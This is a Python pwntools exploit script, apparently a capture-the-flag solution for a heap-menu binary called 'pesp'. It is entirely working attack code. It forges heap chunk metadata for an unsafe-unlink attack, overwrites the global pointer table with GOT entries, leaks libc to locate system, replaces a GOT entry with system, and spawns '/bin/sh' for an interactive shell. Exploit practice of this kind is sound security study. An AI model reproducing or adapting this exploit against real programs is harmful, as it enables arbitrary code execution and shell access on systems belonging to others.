#coding:utf8
from pwn import *
# from LibcSearcher import *
context(log_level='debug',terminal=["tmux","splitw","-h"])
binary = "./pesp"
libc_binary = "/lib/x86_64-linux-gnu/libc.so.6"

p = process(argv=[binary])
# p = remote("",)

elf = ELF(binary)
libc = ELF(libc_binary)

context.arch = "amd64"

def opt(idx):
    p.sendlineafter("Your choice:",str(idx))

def add(length,content):
    opt(2)
    p.sendlineafter("Please enter the length of servant name:",str(length))
    p.sendafter("Please enter the name of servant:",str(content))

def free(idx):
    opt(4)
    p.sendlineafter("Please enter the index of servant:",str(idx))

def edit(idx,length,content):
    opt(3)
    p.sendlineafter("Please enter the index of servant:",str(idx))
    p.sendlineafter("Please enter the length of servant name:",str(length))
    p.sendlineafter("Please enter the new name of the servnat:",str(content))

def show():
    opt(1)


add(0x30,"a"*0x20) # 0
add(0x80,"a"*0x20) # 1
add(0x20,"a"*0x20) # 2
x = 0x6020c8
fake_fd = x-0x18
fake_bk = x-0x10
payload = flat([
    0,0x20,
    fake_fd,fake_bk,
    0x20,0,
    0x30,p8(0x90)
    ])

edit(0,len(payload),payload)
free(1)

payload = flat([
    0x00007ffff7dd18e0,0,
    0x30,elf.got["free"],
    0x30,elf.got["atoi"],
    # 0x30,elf.got["atoi"],
    # 0x30,elf.got["atoi"],
    ])
edit(0,len(payload),payload)

show()
p.recvuntil("0 : ")
libc_base = u64(p.recv(6).ljust(8,"\0")) - libc.sym["free"]
system_addr = libc_base + libc.sym["system"]
log.success("system_addr addr "+ hex(system_addr))

payload = flat([
    system_addr
    ])

edit(1,len(payload),payload)
p.sendline("/bin/sh\x00")

# gdb.attach(p,"set $h=0x603020,$g=0x6020C0")

p.interactive()
